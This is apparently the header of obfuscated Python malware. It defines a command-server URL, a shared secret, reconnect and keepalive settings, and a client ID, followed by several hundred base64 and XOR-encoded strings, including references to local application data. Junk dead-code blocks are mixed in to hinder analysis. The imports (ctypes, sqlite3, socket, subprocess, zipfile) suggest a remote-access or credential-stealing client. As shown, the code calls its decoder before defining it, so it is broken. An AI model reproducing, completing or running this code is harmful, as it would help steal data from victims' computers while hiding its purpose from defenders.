
import os, io, sys, re, json, time, base64, ctypes, shutil, socket, sqlite3
import signal, logging, zipfile, argparse, threading, subprocess, random
from pathlib import Path
from datetime import datetime
from collections import deque
_SERVER  = _D("_s1")   
_SECRET  = _D("_s2")        
_RECON   = 5                                  
_RECON_MAX = 120                              
_CLIENT_ID = None                             
_VERSION = _D("_s3")                           
_KEEPALIVE = 300                              
def _D(b):
    import base64
    d = base64.b64decode(b)
    k = d[0]
    return bytes(c ^ k for c in d[1:]).decode("utf-8")
_s1 = "Amp2dnJxOC0tcGNxcmpncGcsbWxwZ2xmZ3AsYW1v"
_s2 = "SzkqODsjLjkuZignIi4lP2YgLjJmeXt5fw=="
_s3 = "kqO8oryj"
_s4 = "rt7XwN7b2g=="
_s5 = "bh4XHgscDQIHHg=="
_s6 = "YAMSGRAUDw=="
_s7 = "E2NqfWNmZw=="
_s8 = "EmJrcXNl"
_s9 = "UCApIDUiMzw5IA=="
_s10 = "v8/MysvW0w=="
_s11 = "I1NaQlZHSkw="
_s12 = "QyAxOjM3LA=="
_s13 = "BUBXV0pXPyV1bHUlbGt2cWRpaSV1fHFtamsodmpmbmBxbGpeZmlsYGtxWA=="
_s14 = "b0pHDhwMGwYCCkYcTzRKRwMKGQoDAQ4CCkYcMk9KRwIKHBwOCApGHA=="
_s15 = "keHo/+Hk5Q=="
_s16 = "5JONgJCM"
_s17 = "/4iWkczN"
_s18 = "hPfn9uHh6g=="
_s19 = "5JeHloGBig=="
_s20 = "IlFBUEdHTA=="
_s21 = "Hml7fH1/cw=="
_s22 = "x7Wiq6KmtKI="
_s23 = "4pGBkIeHjA=="
_s24 = "eQoaCxwcFw=="
_s25 = "LW9qf3U="
_s26 = "eDIoPT8="
_s27 = "scLSw9TU3+7Xw9Dc1A=="
_s28 = "b0EFHwg="
_s29 = "2q2/uLm7t4W8qLu3vw=="
_s30 = "QisvIyUn"
_s31 = "A09qdWYjbmpgcWxza2xtZiNwd3FmYm5qbWQjdWpiI3N6YnZnamwj4YWRI1RCVSNga3ZtaHAj4YWRI2FicGY1Ny0="
_s32 = "Pk5HX0taV1E="
_s33 = "SSQgKhY6PSg9PDo="
_s34 = "SCUhKxc7PCk8PTs="
_s35 = "LkNHTXFdWk9aW10="
_s36 = "XAsuPSx8Lj0rfAwfEXw1Mnw9fDE1MjUxPTB8Cx0KfDQ5PTg5LnwvM3w+LjMrLzkuL3w/PTJ8ODk/Mzg5fDUocg=="
_s37 = "gLy088m087TzycjIycnIyLTzyQ=="
_s38 = "PW90e3s="
_s39 = "4oaDloM="
_s40 = "mvfz+cX+++77"
_s41 = "2amqrK2wtQ=="
_s42 = "3a6krqm4sIKuqbyprg=="
_s43 = "t9rS2tjFzujH0sXU0tnD"
_s44 = "z6KqoqC9tpC7oLuuo5CorQ=="
_s45 = "I0dKUEh8RVFGRnxEQQ=="
_s46 = "9piTgqmFk5iCqZuU"
_s47 = "4JOFjpOPkpM="
_s48 = "YiEtLzEyJyE="
_s49 = "juH+6+D++vc="
_s50 = "wrGntrGrpg=="
_s51 = "86e2ob4="
_s52 = "bB8YCAUC"
_s53 = "EGR1aGQ="
_s54 = "M0RaXQAB"
_s55 = "EWRldzwp"
_s56 = "YRIVDhE="
_s57 = "XSk4LzA0MzwxAjIoKS0oKQ=="
_s58 = "KFtcR1g="
_s59 = "0bSpuKXb"
_s60 = "biwPDQUJHAEbAApOBQsXAgEJCQscThkHGgZOHgscQxkHAAoBGU4JHAEbHgcACU4PAApOHgscBwEKBw1OCAIbHQZA"
_s61 = "5pafiJaTkg=="
_s62 = "oMvF2czPx//T1MHU1dM="
_s63 = "HnV7Z3JxeUFtan9qa20="
_s64 = "kfr06P3+9s7i5fDl5OI="
_s65 = "oNfJzpOS"
_s66 = "guHq4/A="
_s67 = "CGNtcWRnb1dsaXxp"
_s68 = "fRMcEBg="
_xj = type("X", (), {"__init__": lambda s: None})()
if _xj is not None and 1 == 2:
    del _xj
_s69 = "vt3Oy+HO28zd29DK"
_s70 = "UT8wPDQ="
_s71 = "mPb37Lj+9+32/A=="
_s72 = "KVlQSkhe"
_s73 = "4ZeOjZSMhA=="
_s74 = "n+/m/P7o"
_s75 = "94eOlJaA"
_s76 = "+Y6Ql8rL"
_s77 = "pNzXwdA="
_s78 = "BnFvaDU0"
_s79 = "kPTx4uf5/g=="
_s80 = "8d6iiIKFlJzevZiTg5CDiN6ynoOUopSDh5iSlILevJSfhNG0iYWDkILepIKUg9+clJ+E3rKen4WUn4WC3qOUgp6Eg5KUgt6ytqKUgoKYnp8="
_s81 = "EHx/d3l+c2R8"
_s82 = "9IOdmsfG"
_s83 = "wqajsLWrrA=="
_s84 = "ybmkuqy9"
_s85 = "NUZMRkFQWFZBWQ=="
_s86 = "E1B7cn10djN3dmB4Z3xjM2Ryf39jcmN2YTN1YXx+M398cHJ/M2NyZ3szfGEzRkFfPQ=="
_s87 = "1LygoKTu+/s="
_s88 = "1/m9p7A="
_s89 = "05W6v7bzvbyn87W8pr23"
_s90 = "p9DOyZSV"
_s91 = "NWJUWVlFVEVQRxVWXVRbUlBR"
_s92 = "vtrfzMnX0A=="
_s93 = "JUpWRFZGV0xVUQ=="
_s94 = "MWZQXV1BUEFUQxFSWVBfVlRV"
_s95 = "LUpeSFlZRENKXg=="
_s96 = "ZUhIBwJIFgYECQA="
_s97 = "HEt9cHBsfWx5bjxveWg="
_s98 = "is7PquTl/qr5//r65fj+7+4="
_s99 = "Pm1WUUkeXx5OUU5LTh5TW01NX1lbHlxRRhA="
_s100 = "dQIcG0ZH"
_s101 = "SS0oOz4gJw=="
_s102 = "t9jE1sTUxd7Hww=="
_s103 = "LVdIQ0RZVA=="
_s104 = "eygTFAwV"
_s105 = "Rwg3IilnEhULZy4pZyMiISYyKzNnJTUoMDQiNWk="
_s106 = "vOjd19mc09LZnM/fztnZ0s/U08ic3dLYnM7ZyMnO0pzVyJI="
_s107 = "bgMdHU4AARpODxgPBwIPDAIL"
_s108 = "87G0oas="
_s109 = "L2hKWw9OX19dQFdGQk5bSg9ISkBDQExOW0ZAQQ9ZRk4PZn8B"
_s110 = "ehIODgoJQFVVEwpXGwoTVBkVF1UQCRUUVQ=="
_s111 = "ut/IyNXI"
_s112 = "J2tOVFMHTklUU0ZLS0JDB0ZXV0tOREZTTkhJVAk="
_s113 = "u8zS1YiJ"
_s114 = "YCQJExAMARkuAQ0F"
_s115 = "5oKHlJGPiA=="
_s116 = "pdbc1tHAyPrV18rDzMnA1w=="
_s117 = "eBwIEx8="
_s118 = "3Y2xvKT9vP2/uLit/a6yqLO5/fWKtLO5sqqu9PM="
_s119 = "G2xydSgp"
_s120 = "4qCHh5KHhg=="
_s121 = "rt7P3sLP1w=="
_s122 = "wJCsobmlpA=="
_s123 = "mMv9+er78Lj+9+q4/vH0/eu49fns+/Dx9v+4+bjo+ezs/er2uLD8/ejs8LX08fXx7P38uP736rjr+f797OGxtg=="
_s124 = "NXBNUFZAQVAVVBVGXVBZWRVWWlhYVFtRFVRbURVHUEFAR1sVWkBBRUBBGw=="
_s125 = "/Ki1sbmzqag="
_s126 = "UhA+PTE5fSc8MD49MTlyPz0nITdyMzw2cjk3KzA9MyA2cjs8IicmcnoFOzw2PSUhcj08Pit+ciA3Iyc7IDchcjM2Pzs8e3w="
_s127 = "AnVrbDEw"
_s128 = "ImtMUldWAkBOTUFJR0Y="
_s129 = "0ZO9vrK68bewuL20tfH5v7S0taLxsLW8uL/4"
_s130 = "kMT1/P715A=="
_s131 = "oen19fE="
_s132 = "vPTo6Ozv"
_s133 = "QQw4EhAN"
_s134 = "OmhfXlNJ"
_s135 = "eTQWFx4WPTs="
_s136 = "7Lm8grw="
_s137 = "P2xse28="
_s138 = "hsXu9Onr4+Xn9fI="
_s139 = "4qHS2NfU2NDV"
_s140 = "JxcXHRYWHRQV"
_s141 = "IhFhGBcQGBoQ"
_s142 = "RQd9f3dyfwAH"
_s143 = "h8azvb+0vcKw"
_s144 = "gbPCu8exu7TF"
_s145 = "GCkgIlosIiso"
_s146 = "XGQdZm8aZm0f"
_s147 = "1u/i7OPh7OSV"
_s148 = "Tn5+dH8PdH9/"
_s149 = "bFxcVllcVlla"
_s150 = "SHh4cnkKcnx8"
_s151 = "rp6elJ/qlJnr"
_s152 = "9cPFz8HAz7ex"
_s153 = "OAgIAgh7AgoB"
_s154 = "VxUUbW5lbWEV"
_s155 = "ibm5s7jLs7+6"
_s156 = "yIz48oz48vj7"
_s157 = "xPX8/vby/vD9"
_s158 = "md+ho62vo6ja"
_s159 = "3uyd5Ovq5Ofv"
_s160 = "e0tLQUlPQTk+"
_s161 = "ATExOzA1O0dF"
_s162 = "OQkJAwh8A3oL"
_s163 = "CUplaHp6YG9wKWgpZGhqYWBnbCl9cHlsKWtoemxtKWZnKWB9eilmeWxnKXlme316KWhnbSlmfWFseylqZXxseic="
_s164 = "rN7D2djJ3g=="
_s165 = "84OBmp2HloE="
_ji = 0
for _ in [1,2,3]:
    if False: _ji += 1
_s166 = "SiYjJD8yFTkvODwvOA=="
_s167 = "kf34/+TpzuL04+f04w=="
_s168 = "6J+BhoyHn5u3mIs="
_s169 = "z7y2oaCjoKi2"
_s170 = "2ZeYivn2+Z+wtbz5iryrr7yr"
_s171 = "SD8hJiwnPzsXOy06Pi06"
_s172 = "o9TKzcfM1ND808A="
_s173 = "USY4PzU+JiIOITI="
_s174 = "+5+aj5qZmoie"
_s175 = "ah4aRwYDBAE="
_s176 = "BXdqcHFgdw=="
_s177 = "BnFjZFl1Y3RwY3Q="
_s178 = "vPXT6JyTnPHZ2NXdnPjZytXf2Q=="
_s179 = "/ZyNjZGY"
_s180 = "6IWHioGEjQ=="
_s181 = "bgkBAQkCCw=="
_s182 = "u+jW2snPm/PU1t6b/97N0tje"
_s183 = "TD4tPzwuKT4+NQ=="
_s184 = "4IyJjpWYv5OFkpaFkg=="
_s185 = "jv3h4Pc="
_s186 = "OGtVWUpMGGxuGBcYdV1cUVk="
_s187 = "w6GxrLerprE="
_s188 = "bBweBQIYCR4="
_s189 = "VyI5PDk4IDk="
_s190 = "OmtPU1lRGm55ahpZVVRUX1lOGklZW1QaVVQaWxpWU0lOGlVcGkpVSE5JFBpoX05PSFRJGlZTSU4aVVwaVUpfVBpKVUhOSRQ="
_s191 = "uv3fzprU387N1cjRmtPUzt/I3NvZ38mWmtvZztPM35rZ1dTU39nO09XUyZaa++jqms7b2Nbflprb1N6aytXIzpfJ2dvUmsjfyc/WzsmU"
_s192 = "fRQTCRgPGxweGA4="
_s193 = "PU1OSElUUQ=="
_s194 = "74GOgoo="
_s195 = "ju/q6vzr/f3r/Q=="
_s196 = "M1VSXlpfSg=="
_s197 = "8ZCVlYOUgoI="
_s198 = "xqijsqunta0="
_s199 = "QSMzLiAlIiAyNQ=="
_s200 = "44qNl4aRhYKAhpA="
_s201 = "u9LVz97J3drY3sjk3snJ1Mk="
_s202 = "/IyPiYiVkA=="
_s203 = "2rm1tLS/ua6ztbSp"
_s204 = "nPr98fXw5Q=="
_s205 = "VSEsJTA="
_s206 = "cx8cEBIf"
_s207 = "AnBnb212Zw=="
_s208 = "cQIFEAUEAg=="
_s209 = "UTI+Pz80MiU4Pj8iDjQjIz4j"
_s210 = "dAMdGkdG"
_s211 = "HGt1ci8u"
_s212 = "w6e6raKuqqA="
_s213 = "M1dKXVJeWkJGVg=="
_s214 = "I1daU0Y="
_s215 = "17alp4iypaW4pQ=="
_s216 = "kaOjpb8="
_s217 = "E0Z9eH18ZH0="
_s218 = "YzYNCA0MFA0="
_s219 = "os7NwcPO/czH1tXN0Mk="
_s220 = "3Kq5srizrg=="
_s221 = "gu3y5+zd8u3w9vE="
_s222 = "aQYZDAc2GgwbHwAKDBo="
_s223 = "JElFR0xNSkF7UF1UQQ=="
_s224 = "NVhUVl1cW1BqWVRXUFk="
_s225 = "dRgUFh0cGxAqHBYaGw=="
_s226 = "OVhLSWZNQElc"
_s227 = "iObt/P/n+uM="
_s228 = "XzwwMTE6PCs2MDEs"
_s229 = "x7Wiqqizog=="
_s230 = "oJGSl44="
_s231 = "b15YXUE="
_s232 = "u4uVi5WLlYs="
_s233 = "fBkECBkOEh0QIxQTDwgP"
_s234 = "K1tEWV8="
_s235 = "MkFXQERbUVc="
_s236 = "5pWSh5KTlQ=="
_s237 = "tNjb19XY69XQ0MY="
_s238 = "s93Wx8Tcwdg="
_s239 = "VjMuIjMkODc6CT45JSIl"
_s240 = "i+rn59T75Pn/+A=="
_s241 = "geDt7d7x7vP18g=="
_s242 = "YQQZFQQTDwANPgkOEhUS"
_s243 = "stfKxtfA3NPe7drdwcbB"
_s244 = "pc3K1tHLxMjA"
_s245 = "jv7h/Po="
_s246 = "6pqFmJ4="
_s247 = "DUh1eX9sbnktfmx7aGktfWx+fnpif2l+LWxjaS1uYmJmZGh+LWt/YmAtTmV/YmBoIS1IaWpoIS1LZH9oa2J1Iw=="
_s248 = "qcrB28bEzA=="
_s249 = "8r69sbO+s6KitrOmsw=="
_s250 = "+bipqb24rbg="
_s251 = "Wh01NT02Pw=="
_s252 = "RSYtNyooIA=="
_s253 = "ZQYNFwoIAA=="
_s254 = "q+bCyNnE2MTN3w=="
_s255 = "AWRlZmQ="
_s256 = "zKmoq6k="
_s257 = "BElrfm1oaGU="
_s258 = "dBIdBhESGww="
_s259 = "8pSbgJeUnYo="
_s260 = "dDEMAAYVFwBUBBUHBwMbBhAHVBIGGxlUNxwGGxkdARlZFhUHERBUFgYbAwcRBgdUXDccBhsZEVhUMRATEVhUNgYVAhFYVDsEEQYVWlpaXVo="
_s261 = "16e2pKSguKWzpA=="
_s262 = "ldHw8/Tg+eE="
try:
    raise Exception()
except:
    pass
_s263 = "97uYkJ6Z17OWg5Y="
_s264 = "NWFweGU="
_s265 = "hNfByMHH0KTr9u3j7erb8fboqKTx9+H26uXp4dvy5ejx4aik9OX39/Pr9uDb8uXo8eGkwtbLyaTo6+Pt6vc="
_s266 = "mPvq4ejs9w=="
_s267 = "1KS1p6eju6awpw=="
_s268 = "P1pNTVBN"
_s269 = "mNb97O/36vM="
_s270 = "QQIuLiooJDI="
_s271 = "bTkoID0="
_s272 = "t+Ty+/L045ff2MTD6NzSzpuX2dba0puX0tnUxc7Hw9LT6MHW28LSl/Hl+PqX1NjY3N7SxJf7/vr+45eFh4c="
_s273 = "RCcrKy8tITc="
_s274 = "VzIlJTgl"
_s275 = "ntr7/ezn7uq+3fbs8fP7sdv6+fu+7v/t7enx7Pq+6+338Pm+yffw+vHp7b7azt/O1761vt/bzbOsq6iz2d3TsA=="
_s276 = "A1htbCNnYndiXg=="
_s277 = "DlV6YWEufWZhfHpT"
_s278 = "p/zSyczJyNDJh8HI1crG04c="
_s279 = "IGxvY2FsYXBwZGF0YQ=="
_s280 = "8rWdnZWelw=="
_s281 = "o+7KwNHM0MzF1w=="
_s282 = "Swk5Kj0uGCQtPzwqOS4="
_s283 = "tfrF0MfUleba08HC1MfQ"
_s284 = "h8vo5Obrp9Tz5vPi"
_s285 = "KVxdTwQR"
_s286 = "DGN/U29+dXx4"
_s287 = "l9PH1sfe"
_s288 = "rs3M6s/azw=="
_s289 = "dgYUMhcCFw=="
_s290 = "cwYHFV5L"
_s291 = "2IO7uba2t6z4vL27qqGorIU="
_s292 = "pOHc0NbFx9CE18XSwcCEyMvDzcrXhMLWy8mE4s3WwcLL3ITU1svCzcjB14o="
_s293 = "QTEgMjI2LjMlMg=="
_s294 = "Ml5dVVtcQRxYQV1c"
_s295 = "vMnI2pGE"
_s296 = "henq4uzr9g=="
_s297 = "g/Pi8PD07PHn8A=="
_s298 = "17+4pKO5trqy"
_s299 = "p9LUwtXJxsrC"
_s300 = "g/Pi8PD07PHn"
_s301 = "hvb06eDv6uM="
_s302 = "5IGKh5adlJCBgA=="
_s303 = "8JOfn5uZlYPeg4GcmYSV"
_s304 = "teHw+OU="
_s305 = "FUZQWVBWQTV9emZhOTV7dHhwOTVjdHlgcDVTR1pYNXh6b0p2enp+fHBmNVlcWFxBNSclJQ=="
_s306 = "L0xAQERGSlw="
_s307 = "qcHG2t0="
_s308 = "1qC3uqOz"
_s309 = "RCE2Nis2"
_s310 = "aCwHHwYEBwkMSAlIDgEEDUgOGgcFSD06JEgJBgxIBxgcAQcGCQQEEUgNEA0LHRwNSAEcRg=="
_s311 = "lcHQ2MU="
_s312 = "MkVbXAEA"
_s313 = "SzwiJXh5"
_s314 = "FGR1YHw="
_s315 = "fhAfExs="
_s316 = "xKG2tqu2"
_s317 = "I0ZRUUxR"
_s318 = "mPb59f0="
_s319 = "us7Dyt8="
_s320 = "bwIACwYJBgoL"
_s321 = "pcvEyMA="
_s322 = "h/P+9+I="
_s323 = "u8vaz9M="
_s324 = "jfrs/+Pk4+o="
_s325 = "xYuqseWjqrCroQ=="
_s326 = "kNT1/PXk9fQ="
_s327 = "nfn86fw="
_s328 = "sdTDw97D"
_s329 = "lNf88ff/tOfx5uLx5rTy++a09bT68eO09/j98frgtOLx5uf9+/q6tMbx4OHm+ue0vPrx48vi8ebn/fv6uLTw++P6+Pv18Mvh5vi9tPvmtLza+/rxuLTa+/rxvbo="
_s330 = "+daYiZDWmpWQnJeN1IyJnZiNnA=="
_s331 = "KF5NWltBR0Y="
_s332 = "eh4VDRQWFRseJQ8IFg=="
_s333 = "kN7/sOXg9PHk9bD5/vb/sPP//vb59+Xi9fSw//6w4/Xi5vXi"
_s334 = "8LSfh56cn5GU0ISYldCelYfQ3pWIldCRnpTQg4SRl5XQkdCSkYSTmNCDk4KZgITQhJ/QgpWAnJGTlduClYOEkYKE3g=="
_s335 = "L3tqYn8="
_s336 = "fVgDG00="
_s337 = "I1RKTRAR"
_s338 = "it/67uv+76r56fjj+v6q5uv/5Oni7+6qp6rv8uP+4+Ttqv7lquv6+ubzqv/67uv+7w=="
_s339 = "QQA0NS5sNDElIDUkYSgyYRYoLyUuNjJsLi8tOGEnLjNhLy42"
_s340 = "qerBzMrCicDPidvcx8fAx86J3sDdwYnIzcTAx4nZ28DfwMXMzszaiYH+wMfNxt7aicbHxdCAhw=="
_s341 = "NUJcWwYH"
_s342 = "u8zS1YiJ"
_s343 = "+q+7udqYg4qbiYnak4narZOUnpWNideVlJaD"
_s344 = "WC8xNio9P3g2Nyx4OS45MTQ5OjQ9eD43KngNGRt4OiEoOSsr"
_s345 = "99rakpuSgZaDkpM="
_s346 = "r4KC3Mrd2crd"
_s347 = "WXR0PDU8LzgtPD0="
_s348 = "YycGDwYEAhcGJhsGABYXBg=="
_s349 = "RAAhKCEjJTAhATwhJzEwIQ=="
_s350 = "NmF/eHJ/ZA=="
_s351 = "LXhsbg1PVF1MXl4NWV9ESkpIX0hJDQANSFVEWURDSg1OWF9fSENZDURDXllMQ05I"
_s352 = "xJahqauyoeSiq6Csoai0obbktqGjrbewtr3kr6G9t+SooaKw5Ka95LCsoeSmvbSlt7fq"
_s353 = "wYWkraSmoLWkhLmkorS1pA=="
_s354 = "ms/b2bro//3z6e7o47r59v/79P/+uu/q"
_s355 = "RBQhNi0rIC0nJSgoPWQ0LSojZDAsIWQ3ITYyITZkLCElKDAsZCEqIDQrLSowZDArZDQ2ITIhKjBkFiEqICE2ZCI2KylkNyghITQtKiNq"
_s356 = "u5Tay9KU097a18/T"
_s357 = "qeLMzNmEyMXA38yJ2cDHzonm4g=="
_s358 = "2b+rtqO8tw=="
_s359 = "h/Du6bS1"
if False:
    _x = [i for i in range(1000) if i % 7 == 0]
    _y = "".join(chr(c) for c in range(65, 91))
_s360 = "Dk9eXkpPWk8="
_s361 = "DSNsYGx3YmNgeH5kbg=="
_s362 = "C3UkJWpmanFkZWZ+eGJo"
_s363 = "4aCMgJuOj6yUkoiCqYSNkYSTz4SZhA=="
_s364 = "s56ewNbBxdbB"
_s365 = "BCkpbWA="
_s366 = "BHNtajc2"
_s367 = "C0pmanFkZUZ+eGJoQ25ne255"
_s368 = "EVBBQVVQRVA="
_s369 = "ufjU2MPW1/TMytDa8dzVydzLl8/byg=="
_s370 = "A0ptcHdib29mZzkjUHdicXd2cyNVQVA="
_s371 = "XC8/NCg9Lzcv"
_s372 = "z7ysp7uuvKS8"
_s373 = "yIGmu7yppKStrPLonKm7ow=="
_s374 = "utnI1dTO29g="
_s375 = "v/7S3sXQ0fLKzNbc99rTz9rN"
_s376 = "GXprdndteHs="
_s377 = "K2JFWF9KR0dOTxELSFlERV9KSQ=="
_s378 = "WCZ3djs3Nj4xP3crISssPTU8dy0rPSo="
_s379 = "MlNfU0hdXF9HQVtRH1pXXkJXQBxBV0BEW1FX"
_s380 = "9YaMhoGQmJaBmQ=="
_s381 = "XC8lLyg5MT8oMA=="
_s382 = "LmdAXVpPQkJLShQOXVddWktDSg=="
_s383 = "aR4AB1pb"
_s384 = "i8rm6vHk5cb++OLow+7n++75"
_s385 = "BEVUVEBFUEU="
_s386 = "E2Bwe2dyYHhg"
_s387 = "jO/+4+L47e4="
_s388 = "JGVJRV5LSmlRV01HbEFIVEFW"
_s389 = "C0pmanFkZUZ+eGJoQ25ne255"
_s390 = "exgJFBUPGhk="
_s391 = "36Hw8bywsbm2uPCspqyrurK78Kqsuq3wvrK+pbCxsqqstrzyt7qzr7qt8ay6ram2vLo="
_s392 = "SDsxOzwtJSs8JA=="
_s393 = "ewgCCA8eFhgPFw=="
_s394 = "otHB0MfHzA=="
_s395 = "N0BSVVRWWg=="
_s396 = "fh0REBAbHQo="
_s397 = "JGdLSkpBR1BBQA=="
_s398 = "9pWan5OYgqmEk5GfhYKThA=="
_s399 = "Nl9YUFk="
_s400 = "36qsuq2xvrK6"
_s401 = "QyUmIjc2MSYw"
_s402 = "oMHVxMnP"
_s403 = "FXF8ZnZ6e3twdmE="
_s404 = "YSUIEgIODw8EAhUEBQ=="
_s405 = "P01aWFZMS01eS1ZQUWBQVA=="
_s406 = "Hn1yd3twakF3eg=="
_s407 = "5JeQhZaQu5eHloGBiruHhZSQkZaB"
_s408 = "jOHj4uX44/4="
_s409 = "84CQgZaWnayQkoOHhoGWrICHkoeGgA=="
_s410 = "Sjk+JToVOSk4Ly8kFSkrOj4/OC8="
_s411 = "m+j46f7+9cT4+uvv7un+xOjv+u/u6A=="
_s412 = "TT4oORI+Lj8oKCMSICIjJDkiPw=="
_s413 = "OVRWV1BNVks="
_s414 = "446MjYqXjJE="
_s415 = "RjUlNCMjKBklJzYyMzQjGTUyJzIzNQ=="
_s416 = "1qWzoomltaSzs7iJp6O3ur+irw=="
_s417 = "3K2pvbC1qKU="
_s418 = "RDcnJSgh"
_s419 = "cgEGEwAGLQUXEBETHw=="
_s420 = "0Ke1srOxvY+jpLGkpaM="
_s421 = "VyQjOCcIIDI1NDY6"
_s422 = "zrmrrK2vo5G9uq+6u70="
_s423 = "JlVDUnlRQ0RFR0t5V1NHSk9SXw=="
_s424 = "JFVRRUhNUF0="
_s425 = "BmtvZVl1cmd0cg=="
_s426 = "17q+tIiko7in"
_s427 = "6oeDibWZnouen5k="
_s428 = "2rG/o7a1vYWprruorg=="
_s429 = "yqGvs6alrZW5vqW6"
_s430 = "pMnL0dfB+8HSwcrQ"
_s431 = "+4uClYuOjw=="
_s432 = "chMRBhsdHA=="
_s433 = "HnNxaHs="
_s434 = "MVxeR1RuQ1RdUEVYR1Q="
_s435 = "54SLjoSM"
_s436 = "XDA5Oig="
_s437 = "VDYhICA7Og=="
_s438 = "6ZmbjJqa"
_s439 = "YBIFDAUBEwU="
_s440 = "cAMTAh8cHA=="
_s441 = "h+zi/uXo5vXj2OLx4unz"
_s442 = "xbW8q7WwsQ=="
_s443 = "wqG2sK4="
_s444 = "End8Zndg"
_s445 = "eh4fFh8OHw=="
_s446 = "tdHawts="
_s447 = "MlNRRltdXA=="
_s448 = "vs7M283N"
_s449 = "JVdASUBEVkA="
_s450 = "MVJeXFNe"
_s451 = "pc7A3NY="
_s452 = "RDA9NCE="
_s453 = "7p2GgZyajZua"
_s454 = "LU5ZX0FyTEFZcklIQQ=="
_s455 = "MFFcRG9EUVI="
_s456 = "3Ku1soO4"
if 0:
    import hashlib
    _h = hashlib.sha256(b"dead").hexdigest()
_s457 = "UiU7PA03"
_s458 = "u9jPydfk2A=="
_s459 = "RCcwNigbPA=="
_s460 = "Ti06PCIRLw=="
_s461 = "WzU6Nj4="
_s462 = "1qKzpLu/uLe6iaWit6Si"
_s463 = "kOT14v35/vH8z+Pk8eTl4w=="
_s464 = "3qq7rLO3sL+ygbewrquq"
_s465 = "TywgIiIuISs="
_s466 = "CHxtemVhZmlkV3t8Z3g="
_s467 = "dwMSBRoeGRYbKAQDFgMCBA=="
_s468 = "PE9IXU5IY09FT0hZUWNRU1JVSFNO"
_s469 = "A25sbWp3bHFccHdid3Zw"
_s470 = "xrWyqbaZtb+1sqOrmaupqK+yqbQ="
_s471 = "k/78/frn/OHM4Ofy5+bg"
_s472 = "UjU3Jg0iID0xNyEhNyE="
_s473 = "ViYkOTUzJSUJOj8lIg=="
_s474 = "FX58eXlKZWd6dnBmZg=="
_s475 = "vs7M0d3bzc3h1dfS0uHM283L0so="
_s476 = "0bK9uKGzvrCjtY62tKU="
_s477 = "/IyFjJmOn5CVjA=="
_s478 = "YwAPChMBDAIRBzwHAhcC"
_s479 = "O1hXUktZVFpJX2RfWk9a"
_s480 = "j+zj5v/t4O7969Dr7vvu"
_s481 = "EHN8eWByf3FidE9jdWQ="
_s482 = "8YGIgZSDkp2YgQ=="
_s483 = "+Y2cgY0="
_s484 = "YwAPChMBDAIRBzwQFwIXFhA="
_s485 = "fB8QFQweEx0OGCMPCB0ICQ8="
_s486 = "LUxYSURCckpIWXJbQkFYQEg="
_s487 = "1bSgsby6iqO6uaC4sA=="
_s488 = "udjM3dDW5srczebP1tXM1Nw="
_s489 = "ge3k9+Tt"
_s490 = "Dm97amdhUXphaWlia1Fje3pr"
_s491 = "Ti87KichETghIjsjKw=="
_s492 = "y7ukvK65lKakpaK/pLmUpK2t"
_s493 = "m+v07P7pxOn+6O737w=="
_s494 = "MEBfR1VCb1xfU1s="
_s495 = "36+wqLqtgK26rKqzqw=="
_s496 = "O0tUTF5JZEhXXl5L"
_s497 = "8oKdhZeArYCXgYeehg=="
_s498 = "kebw/f3h8OH0487i9OU="
_s499 = "gPDh9Og="
_s500 = "CWR6bmtmcVZ6YWZ+"
_s501 = "7ZmEmYGI"
_s502 = "44yTho28lpGP"
_s503 = "bg0DCjEcCx0bAho="
_s504 = "pNDFz8H718fWwcHK18zL0A=="
_s505 = "RTYmNyAgKzYtKjEaNyA2MCkx"
_s506 = "bgkLGjEJCwEHHg=="
_s507 = "stXX3dvC7cDXwcfexg=="
_s508 = "AmVndl1jcnJx"
_s509 = "fRwNDQ4iDxgOCBEJ"
_s510 = "36+zvqaArLCqsbs="
_s511 = "5IKWgZU="
_s512 = "ZxQCBhUEDzgBDgsCFA=="
_s513 = "eAoXFww="
_s514 = "ut/C39nPzt/l2dXX19vU3g=="
_s515 = "nf7y8PD88/k="
_s516 = "7oqBmYCCgY+KsYuWi40="
_s517 = "EWFwZXk="
_s518 = "v9bRz8rL4N3T0NzU"
_s519 = "gOPt5N/y5fP17PQ="
_s520 = "YwoNExYXPBYNAQ8MAAg="
_s521 = "WDs1PAcqPSstNCw="
_s522 = "iuzj5u/V5uP5/g=="
_s523 = "o8XKz8b8z8rQ1/zRxtDWz9c="
_s524 = "37m2s7qAu7CosbOwvruArbquqrqsqw=="
_s525 = "dRMcGRAqERoCGxkaFBEqFh0AGx4="
_s526 = "ex0SFx4kHx4XHg8e"
_s527 = "ZhYHEg4="
_s528 = "yK6hpK2Xpq2/l66npKytug=="
_s529 = "lOT15vH64A=="
_s530 = "MVdYXVRuREFdXlBVblJZRF9a"
_s531 = "Wys6LzM="
_s532 = "EHZ5fHVPZWB8f3F0T2J1Y2V8ZA=="
_s533 = "WjQ/Li01KDEFMzQ8NQ=="
_s534 = "fhAbCgkRDBUhFxAYESEMGw0LEgo="
_s535 = "qsjYxd3Zz9j12d7Py8Y="
_s536 = "ZCYWCxMXARZEFxABBQgBFkQWARURARcQAQA="
_s537 = "xae3qrK2oLeatrGgpKmat6C2sKmx"
_s538 = "DGdlYGBTf3tleG9k"
_s539 = "O3Byd3cbaGxyb3hz"
_s540 = "KHppe1hATVpNCGtEQU1GXA=="
_s541 = "BCkpd2F2cmF2"
_s542 = "wu/vsaehsKe2"
_s543 = "YE1NCQQ="
_s544 = "bUBAHwgOAgMDCA4Z"
_s545 = "+tfXk5SJjpuWlg=="
_s546 = "qIWF3cbBxtvcycTE"
_s547 = "akdHBAVHGg8YGQMZHg=="
_s548 = "iKWl7eTt/un87ew="
_s549 = "c15eHRxeFh8WBRIHFg=="
_s550 = "ioDRodeq2u/4+eP5/u/k6e+q+O/n5fzv7qSA"
_s551 = "KSNyBHQJZ0YJWUxbWkBaXUxHSkwJT0ZcR00HIw=="
_s552 = "Ck9YWEVYMConJ3lveHxveCprZG4qJyd5b2l4b34qeG97f2N4b24qbGV4KicnY2R5fmtmZg=="
_s553 = "q6HwgPaL+87Z2MLY387FyM6LwsXY38rHx87Piovq3t/Ehtjfytnfi8TFi8nExN+FoQ=="
try:
    raise Exception()
except:
    pass
_s554 = "qaPyhPSJ4Mfa3cjFxYnPyMDFzM2Hifvcx4nI2onIzcTAx4ej"
_s555 = "vMvV0o+O"
_s556 = "s/3cx5PS197a3ZOek9LHx9bew8fa3dSTwNrf1t3Hk+by8JPRysPSwMCdnZ0="
_s557 = "QBthHWAVAQNgIjkwITMzYCYhKSwlJGBtYDI1Li4pLidgNyk0KGAsKS0pNCUkYDAyKTYpLCUnJTM="
_s558 = "w4Kvsaaip7rjsbatraqtpOOisOOip66qrQ=="
_s559 = "4IWMhZaBlIWE"
